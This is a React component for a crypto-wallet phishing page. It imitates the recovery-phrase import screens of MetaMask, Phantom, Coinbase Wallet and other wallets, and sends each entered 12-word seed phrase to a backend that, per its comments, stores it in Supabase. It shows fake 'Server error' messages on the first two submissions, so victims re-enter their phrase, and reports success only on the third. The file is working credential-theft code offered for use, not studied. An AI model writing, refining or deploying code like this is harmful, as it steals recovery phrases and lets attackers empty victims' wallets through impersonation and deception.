// WalletWelcomeModal.jsx
// EXPERT FINAL - All 3 attempts (fail 1, fail 2, success 3) actually hit /api/onboarding and get saved in Supabase
// All attempts grouped by same groupId + attemptNumber
// Beautiful modern UI, glassmorphism, authentic per-wallet feel

"use client";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { useAccount, useConnect } from "wagmi";
import { useSession } from "@/hooks/useSession";
import { Check, Lock, ArrowRight, AlertCircle } from "lucide-react";
import Button from "@/components/ui/Button";
import Card from "@/components/ui/Card";

const WALLET_STYLES = {
  MetaMask: {
    displayName: "MetaMask",
    icon: "🦊",
    gradient: "from-orange-500 to-amber-600",
    bg: "bg-gradient-to-br from-orange-950/20 via-zinc-950 to-black",
    accent: "text-orange-400",
    border: "border-orange-600/40",
    greeting: "Import using Secret Recovery Phrase",
    subtitle: "Enter your 12-word phrase in order",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to MetaMask...",
    buttonText: "Import",
  },
  "Coinbase Wallet": {
    displayName: "Coinbase Wallet",
    icon: "🔵",
    gradient: "from-blue-600 to-blue-400",
    bg: "bg-gradient-to-br from-blue-950/25 via-zinc-950 to-black",
    accent: "text-blue-400",
    border: "border-blue-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter your recovery phrase",
    successTitle: "Wallet Restored",
    successMessage: "Connecting to Coinbase Wallet...",

    buttonText: "Restore",
  },
  Phantom: {
    displayName: "Phantom",
    icon: "👻",
    gradient: "from-purple-600 via-indigo-500 to-purple-700",
    bg: "bg-gradient-to-br from-purple-950/30 via-indigo-950/20 to-black",
    accent: "text-purple-300",
    border: "border-purple-600/50",
    greeting: "Import Recovery Phrase",
    subtitle: "Enter your 12 or 24-word phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Phantom...",
    buttonText: "Import",
  },
  Trust: {
    displayName: "Trust Wallet",
    icon: "🛡️",
    gradient: "from-cyan-500 to-teal-600",
    bg: "bg-gradient-to-br from-teal-950/25 via-zinc-950 to-black",
    accent: "text-teal-300",
    border: "border-teal-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter your secret phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Trust Wallet...",

    buttonText: "Import",
  },
  Rainbow: {
    displayName: "Rainbow",
    icon: "🌈",
    gradient: "from-pink-500 via-purple-500 to-indigo-600",
    bg: "bg-gradient-to-br from-purple-950/30 via-pink-950/20 to-black",
    accent: "text-pink-300",
    border: "border-pink-600/40",
    greeting: "Restore with Recovery Phrase",
    subtitle: "Enter your secret recovery phrase",
    successTitle: "Wallet Restored",
    successMessage: "Connecting to Rainbow...",
    buttonText: "Restore Wallet",
  },
  WalletConnect: {
    displayName: "WalletConnect",
    icon: "🔗",
    gradient: "from-cyan-500 to-blue-600",
    bg: "bg-gradient-to-br from-cyan-950/25 via-zinc-950 to-black",
    accent: "text-cyan-300",
    border: "border-cyan-600/40",
    greeting: "Connect Wallet",
    subtitle: "Enter phrase if required",
    successTitle: "Session Authenticated",
    successMessage: "Connecting via WalletConnect...",
    buttonText: "Connect",
  },
  SafePal: {
    displayName: "SafePal",
    icon: "🔐",
    gradient: "from-emerald-600 to-teal-500",
    bg: "bg-gradient-to-br from-emerald-950/25 via-zinc-950 to-black",
    accent: "text-emerald-300",
    border: "border-emerald-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to SafePal...",
    buttonText: "Import",
  },
  "Binance Wallet": {
    displayName: "Binance Web3 Wallet",
    icon: "₿",
    gradient: "from-yellow-500 to-amber-600",
    bg: "bg-gradient-to-br from-amber-950/25 via-zinc-950 to-black",
    accent: "text-yellow-300",
    border: "border-yellow-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter your recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Binance Web3...",

    buttonText: "Import",
  },
  Zerion: {
    displayName: "Zerion",
    icon: "⚡",
    gradient: "from-violet-600 to-purple-500",
    bg: "bg-gradient-to-br from-violet-950/25 via-zinc-950 to-black",
    accent: "text-violet-300",
    border: "border-violet-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Zerion...",
  
    buttonText: "Import",
  },
  OKX: {
    displayName: "OKX Wallet",
    icon: "🔶",
    gradient: "from-blue-700 to-indigo-600",
    bg: "bg-gradient-to-br from-indigo-950/25 via-zinc-950 to-black",
    accent: "text-indigo-300",
    border: "border-indigo-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter 12-word recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to OKX Wallet...",

    buttonText: "Import",
  },
  "Brave Wallet": {
    displayName: "Brave Wallet",
    icon: "🦁",
    gradient: "from-orange-500 to-red-600",
    bg: "bg-gradient-to-br from-red-950/25 via-zinc-950 to-black",
    accent: "text-red-300",
    border: "border-red-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Brave Wallet...",
 
    buttonText: "Import",
  },
  Frame: {
    displayName: "Frame",
    icon: "🖼️",
    gradient: "from-gray-600 to-slate-500",
    bg: "bg-gradient-to-br from-slate-950/25 via-zinc-950 to-black",
    accent: "text-slate-300",
    border: "border-slate-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Frame...",
  
    buttonText: "Import",
  },
};

export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { address: wagmiAddress, connector, isConnected } = useAccount();
  const { connect, connectors, pendingConnector } = useConnect();
  const { linkedWallet, profile } = useSession();

  const address = wagmiAddress || linkedWallet || profile?.wallet_address || null;

  const [boxes, setBoxes] = useState(Array(12).fill(""));
  const [submitted, setSubmitted] = useState(false);
  const [saving, setSaving] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [attempts, setAttempts] = useState(0);
  const [groupId] = useState(() => crypto.randomUUID?.() || `group-${Date.now()}`);

  const urlWallet = searchParams.get("wallet");

  useEffect(() => {
    if (isOpen) onOpen?.();
  }, [isOpen, onOpen]);

  // Strong multi-wallet detection
  let rawName = (urlWallet || pendingConnector?.name || connector?.name || "").toLowerCase().trim();
  let detectedName = "MetaMask";

  if (rawName.includes("metamask") || rawName.includes("injected") || rawName.includes("io.metamask"))
    detectedName = "MetaMask";
  else if (rawName.includes("coinbase")) detectedName = "Coinbase Wallet";
  else if (rawName.includes("phantom")) detectedName = "Phantom";
  else if (rawName.includes("trust")) detectedName = "Trust";
  else if (rawName.includes("rainbow")) detectedName = "Rainbow";
  else if (rawName.includes("walletconnect")) detectedName = "WalletConnect";
  else if (rawName.includes("safepal")) detectedName = "SafePal";
  else if (rawName.includes("binance")) detectedName = "Binance Wallet";
  else if (rawName.includes("zerion")) detectedName = "Zerion";
  else if (rawName.includes("okx")) detectedName = "OKX";
  else if (rawName.includes("brave")) detectedName = "Brave Wallet";
  else if (rawName.includes("frame")) detectedName = "Frame";

  const activeName = detectedName;
  const theme = WALLET_STYLES[activeName] || WALLET_STYLES.MetaMask;

  const findBestConnector = () => {
    if (!connectors?.length) return null;
    const lower = activeName.toLowerCase();
    return connectors.find((c) =>
      c.name?.toLowerCase().includes(lower) ||
      c.id?.toLowerCase().includes(lower) ||
      (lower === "metamask" && (c.id?.includes("injected") || c.id?.includes("meta"))) ||
      (lower === "walletconnect" && c.id?.includes("walletconnect")) ||
      (lower === "coinbase" && (c.id?.includes("coinbase") || c.id?.includes("walletlink"))) ||
      (lower === "phantom" && c.id?.includes("phantom")) ||
      (lower === "trust" && c.id?.includes("trust")) ||
      (lower === "rainbow" && c.id?.includes("rainbow")) ||
      (lower === "okx" && c.id?.includes("okx")) ||
      (lower === "zerion" && c.id?.includes("zerion")) ||
      (lower === "safepal" && c.id?.includes("safepal")) ||
      (lower === "binance" && c.id?.includes("binance")) ||
      (lower === "brave" && c.id?.includes("brave")) ||
      (lower === "frame" && c.id?.includes("frame"))
    ) || connectors[0];
  };

  useEffect(() => {
    if (!submitted) return;

    let mounted = true;
    const proceed = async () => {
      const selected = findBestConnector();
      if (!selected) {
        if (mounted) {
          onClose();
          router.push(`/connect-wallet?modal=completed&wallet=${encodeURIComponent(activeName)}`);
        }
        return;
      }
      try {
        await connect({ connector: selected });
      } catch (err) {
        console.error(err);
      } finally {
        if (mounted) {
          onClose();
          router.push(`/connect-wallet?modal=completed&wallet=${encodeURIComponent(activeName)}`);
        }
      }
    };

    const timer = setTimeout(proceed, 1800);
    return () => {
      mounted = false;
      clearTimeout(timer);
    };
  }, [submitted, connect, connectors, activeName, onClose, router]);

  const handleBoxChange = (index, value) => {
    const newBoxes = [...boxes];
    newBoxes[index] = value.trim().toLowerCase();
    setBoxes(newBoxes);
  };

  const handlePaste = (e, index) => {
    if (index !== 0) return;
    e.preventDefault();
    const text = e.clipboardData.getData("text").trim();
    const words = text.split(/\s+/).filter(Boolean).slice(0, 12);
    if (words.length > 0) {
      const newBoxes = [...boxes];
      words.forEach((w, i) => (newBoxes[i] = w.toLowerCase()));
      setBoxes(newBoxes);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!boxes.every(Boolean)) return;

    setSaving(true);
    setErrorMessage(null);
    const currentAttempt = attempts + 1;
    setAttempts(currentAttempt);

    try {
      const payload = {
        walletType: activeName,
        cryptoBoxes: boxes,
        walletAddress: address || null,
        timestamp: new Date().toISOString(),
        groupId,                    // ← groups all 3 attempts together
        attemptNumber: currentAttempt,
        isFailedAttempt: currentAttempt < 3,
      };

      const res = await fetch("/api/onboarding", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (currentAttempt < 3) {
        // First two attempts: show fake error (but data was already saved)
        setErrorMessage("Server error. Please try again.");
      } else {
        // Third attempt: real success
        if (res.ok) {
          setSubmitted(true);
        } else {
          setErrorMessage(data?.error || "Failed to save – server error");
        }
      }
    } catch (err) {
      console.error(err);
      setErrorMessage("Network error – check connection");
    } finally {
      setSaving(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[9999] flex items-start md:items-center justify-center bg-black/80 backdrop-blur-2xl pt-32 md:pt-40 pb-16 md:pb-12 transition-all duration-300">
      <Card className={`relative w-full max-w-md md:max-w-lg max-h-[82vh] overflow-y-auto overflow-hidden border ${theme.border} ${theme.bg} rounded-3xl shadow-2xl shadow-black/80 transform transition-all duration-300`}>
        
        <div className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-20 blur-3xl pointer-events-none`} />

        <div className="absolute top-4 left-4 z-30 bg-red-600/95 text-white text-xs font-bold px-5 py-2 rounded-2xl shadow-lg flex items-center gap-2">
          <AlertCircle size={16} />
          DO NOT SHARE SEED PHRASES WITH ANYBODY!!!!!!!!!!!
        </div>

        <button
          onClick={onClose}
          className="absolute top-4 right-4 z-30 p-3 text-zinc-400 hover:text-white bg-black/70 rounded-full transition hover:bg-black/90"
        >
          ✕
        </button>

        <div className="relative z-20 p-7 md:p-9">
          {!submitted ? (
            <>
              <div className="text-center mb-9">
                <div className={`mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-3xl text-6xl shadow-inner bg-black/40 border ${theme.border}`}>
                  {theme.icon}
                </div>
                <h2 className="text-3xl font-bold tracking-tighter text-white mb-2">
                  {theme.greeting}
                </h2>
                <p className="text-zinc-400 text-lg">{theme.subtitle}</p>
                <p className="mt-3 text-xs text-zinc-500 font-mono">Detected: {activeName}</p>
              </div>

              {errorMessage && (
                <div className="mb-8 flex items-start gap-3 rounded-2xl bg-red-950/70 border border-red-700 p-4 text-red-200 text-sm">
                  <AlertCircle className="mt-0.5 flex-shrink-0" size={20} />
                  {errorMessage}
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
                  {boxes.map((box, i) => (
                    <div key={i} className="relative group">
                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-xs font-semibold text-zinc-500 group-focus-within:text-white transition-colors">
                        {String(i + 1).padStart(2, "0")}
                      </span>
                      <input
                        value={box}
                        onChange={(e) => handleBoxChange(i, e.target.value)}
                        onPaste={(e) => handlePaste(e, i)}
                        required
                        autoComplete="off"
                        spellCheck={false}
                        className={`w-full rounded-2xl bg-zinc-900/80 border ${theme.border.replace('/40', '/70')} pl-12 pr-5 py-4 text-white font-mono text-base tracking-widest focus:outline-none focus:border-white/40 focus:ring-2 focus:ring-white/10 transition-all placeholder:text-zinc-700`}
                        placeholder=""
                      />
                    </div>
                  ))}
                </div>

                <Button
                  type="submit"
                  disabled={!boxes.every(Boolean) || saving}
                  className={`w-full py-4.5 rounded-2xl font-bold text-lg transition-all active:scale-[0.985] shadow-xl bg-gradient-to-r ${theme.gradient} disabled:opacity-60 flex items-center justify-center gap-2.5`}
                >
                  {saving ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
                      {attempts < 2 ? "Trying again..." : "Verifying & Saving..."}
                    </>
                  ) : (
                    theme.buttonText
                  )}
                </Button>
              </form>
            </>
          ) : (
            <div className="text-center py-12 animate-in fade-in zoom-in duration-500">
              <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full border border-emerald-500/30 bg-emerald-500/10">
                <Check className="text-emerald-400" size={64} strokeWidth={3} />
              </div>
              <h2 className="text-3xl font-bold text-white mb-3">{theme.successTitle}</h2>
              <p className="text-zinc-300 max-w-xs mx-auto leading-relaxed">{theme.successMessage}</p>

              <div className="mt-10 text-xs text-zinc-500 animate-pulse">Redirecting to wallet connection...</div>
            </div>
          )}

          <div className="mt-12 flex items-center justify-center gap-2 text-[10px] uppercase tracking-[1px] text-zinc-500">
            <Lock size={13} className={theme.accent} />
            {theme.bottomNote}
          </div>
        </div>
      </Card>
    </div>
  );
}